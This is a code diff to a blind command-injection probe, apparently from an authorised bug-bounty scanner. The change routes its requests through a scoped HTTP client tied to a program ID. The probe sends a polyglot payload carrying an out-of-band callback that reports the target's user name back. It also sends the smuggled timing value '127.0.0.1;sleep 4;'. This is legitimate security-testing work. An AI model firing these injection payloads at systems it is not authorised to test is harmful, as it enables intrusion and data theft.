@@ -22,7 +22,7 @@
  * egress is filtered — weaker evidence (latency deltas can have other
  * causes), so it's flagged medium/unconfirmed rather than critical.
  */
-import axios from "axios";
+import { scopedHttp } from "../net/scoped-http";
 import logger from "../../utils/logger";
 import { callbackServer } from "../oob/callback-server";
 
@@ -79,13 +79,13 @@ function buildPolyglotPayload(callbackUrl: string): string {
 }
 
 class BlindCommandInjectionProber {
-  async probe(targetUrl: string, authHeaders?: Record<string, string>): Promise<CmdInjectionProbeResult> {
+  async probe(targetUrl: string, authHeaders?: Record<string, string>, programId?: number): Promise<CmdInjectionProbeResult> {
     const base = targetUrl.replace(/\/$/, "");
     const vulns: CmdInjectionVuln[] = [];
     const headers = { ...(authHeaders ?? {}) };
 
     for (const t of TARGETS) {
-      const vuln = await this.tryTarget(base, t, headers);
+      const vuln = await this.tryTarget(base, t, headers, programId);
       if (vuln) vulns.push(vuln);
     }
 
@@ -101,23 +101,23 @@ class BlindCommandInjectionProber {
     return { targetsTested: TARGETS.length, vulns, hypotheses };
   }
 
-  private async send(url: string, t: InjectionTarget, value: string, headers: Record<string, string>) {
+  private async send(url: string, t: InjectionTarget, value: string, headers: Record<string, string>, programId?: number) {
     if (t.method === "get") {
-      return axios.get(url, { params: { [t.param]: value }, headers, timeout: 10000, validateStatus: () => true });
+      return scopedHttp.get(url, { params: { [t.param]: value }, headers, timeout: 10000, validateStatus: () => true }, programId);
     }
-    return axios.post(url, { [t.param]: value }, {
+    return scopedHttp.post(url, { [t.param]: value }, {
       headers: { "Content-Type": "application/json", ...headers },
       timeout: 10000,
       validateStatus: () => true,
-    });
+    }, programId);
   }
 
-  private async tryTarget(base: string, t: InjectionTarget, headers: Record<string, string>): Promise<CmdInjectionVuln | null> {
+  private async tryTarget(base: string, t: InjectionTarget, headers: Record<string, string>, programId?: number): Promise<CmdInjectionVuln | null> {
     const url = `${base}${t.path}`;
     const { beaconId, callbackUrl } = callbackServer.generateBeacon();
     try {
       const payload = buildPolyglotPayload(callbackUrl);
-      await this.send(url, t, payload, headers);
+      await this.send(url, t, payload, headers, programId);
       const hit = await callbackServer.waitForHit(beaconId, 7000);
       if (hit) {
         const who = hit.exfil?.u;
@@ -131,17 +131,17 @@ class BlindCommandInjectionProber {
       callbackServer.cleanup(beaconId);
     }
 
-    return this.tryTiming(url, t, headers);
+    return this.tryTiming(url, t, headers, programId);
   }
 
-  private async tryTiming(url: string, t: InjectionTarget, headers: Record<string, string>): Promise<CmdInjectionVuln | null> {
+  private async tryTiming(url: string, t: InjectionTarget, headers: Record<string, string>, programId?: number): Promise<CmdInjectionVuln | null> {
     try {
       const t0 = Date.now();
-      await this.send(url, t, "127.0.0.1", headers);
+      await this.send(url, t, "127.0.0.1", headers, programId);
       const baseline = Date.now() - t0;
 
       const t1 = Date.now();
-      await this.send(url, t, "127.0.0.1;sleep 4;", headers);
+      await this.send(url, t, "127.0.0.1;sleep 4;", headers, programId);
       const delayed = Date.now() - t1;
 
       const delta = delayed - baseline;
